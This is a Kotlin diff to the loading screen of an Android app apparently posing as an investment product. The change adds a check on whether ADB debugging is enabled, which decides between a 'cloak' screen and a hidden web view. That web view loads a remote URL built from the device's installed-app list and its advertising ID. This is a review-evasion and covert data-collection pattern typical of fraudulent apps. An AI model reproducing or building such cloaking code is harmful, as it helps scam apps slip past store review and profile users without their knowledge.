@@ -1,7 +1,9 @@
 package manage.invest.pre.gaz.ui.fragments
 
+import android.app.Activity
 import android.content.Context
 import android.os.Bundle
+import android.provider.Settings
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
@@ -12,17 +14,17 @@ import androidx.lifecycle.lifecycleScope
 import androidx.navigation.fragment.findNavController
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import manage.invest.pre.gaz.CustomApp
 import manage.invest.pre.gaz.R
 import manage.invest.pre.gaz.databinding.LoadingFragmentBinding
+import manage.invest.pre.gaz.ui.MainActivity
 import manage.invest.pre.gaz.util.AppsLoader
-import manage.invest.pre.gaz.util.Checker
 import manage.invest.pre.gaz.util.UriBuilder
 
 class LoadingFragment : Fragment() {
 
     private var _binding: LoadingFragmentBinding? = null
     private val binding get() = _binding!!
-    private val checker = Checker()
 
     private lateinit var savedUrl: String
     lateinit var url: String
@@ -52,8 +54,7 @@ class LoadingFragment : Fragment() {
         super.onViewCreated(view, savedInstanceState)
         val pref = requireActivity().getSharedPreferences("pref", Context.MODE_PRIVATE)
         val appsLoader = AppsLoader(requireActivity())
-
-        if (checker.isDeviceSecured(requireActivity())) {
+        if (adbCheck(requireActivity()) != "1") {
             startCloak()
         } else {
             savedUrl = pref.getString("savedUrl", "").toString()
@@ -61,7 +62,7 @@ class LoadingFragment : Fragment() {
             if (savedUrl == "") {
                 lifecycleScope.launch(Dispatchers.IO) {
                     appsLoader.getApps(requireActivity()).collect {
-                        url = builder.buildUrl(it, requireActivity())
+                        url = builder.buildUrl(it, requireActivity(), CustomApp.adId)
                         lifecycleScope.launch(Dispatchers.Main) {
                             startWEb(url)
                         }
@@ -70,7 +71,6 @@ class LoadingFragment : Fragment() {
             } else {
                 startWEb(savedUrl)
             }
-
         }
     }
 
@@ -81,6 +81,10 @@ class LoadingFragment : Fragment() {
     private fun startWEb(url: String) {
         val bundle = bundleOf("url" to url)
         findNavController().navigate(R.id.webFragment, bundle)
+    }
+
+    private fun adbCheck(activity: Activity): String {
+        return Settings.Global.getString(activity.contentResolver, Settings.Global.ADB_ENABLED)
     }
 
     override fun onDestroy() {
